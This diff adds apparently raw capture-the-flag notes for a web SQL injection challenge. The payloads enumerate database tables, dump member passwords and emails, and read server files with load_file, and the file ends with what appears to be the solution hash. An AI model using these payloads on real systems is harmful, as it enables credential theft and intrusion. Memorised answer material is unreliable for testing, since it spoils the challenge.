@@ -1,0 +1,26 @@
+
+ORDER BY 1#
+ORDER BY 2#
+ORDER BY 3#
+ORDER BY 4#
+UNION SELECT @@version,null,null,null FROM dual #
+UNION SELECT @@version, NULL, NULL, NULL #
+
+UNION SELECT table_name, null,null,null FROM information_schema.tables #
+UNION SELECT table_name, table_name,table_name,table_name FROM information_schema.tables #
+
+UNION SELECT table_name, null,null,null FROM information_schema.tables WHERE table_schema = database()# 
+UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_name =0x6d656d626572# 
+
+-1 UNION SELECT null,null,null,group_concat(column_name) from information_schema.columns where table_name=0x6d656d626572#
+
+-1 UNION SELECT null,null,null,group_concat(member_id,member_login,member_password,member_email) from member#
+0x696e6465782e706870
+/challenge/web-serveur/ch31/index.php
+0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870
+-1 UNION SELECT null,null,null,load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870)#
+stringxor($key, base64_decode($data['member_password'])))
+
+
+c92fcd618967933ac463feb85ba00d5a7ae52842
+/challenge/web-serveur/ch31/index.php
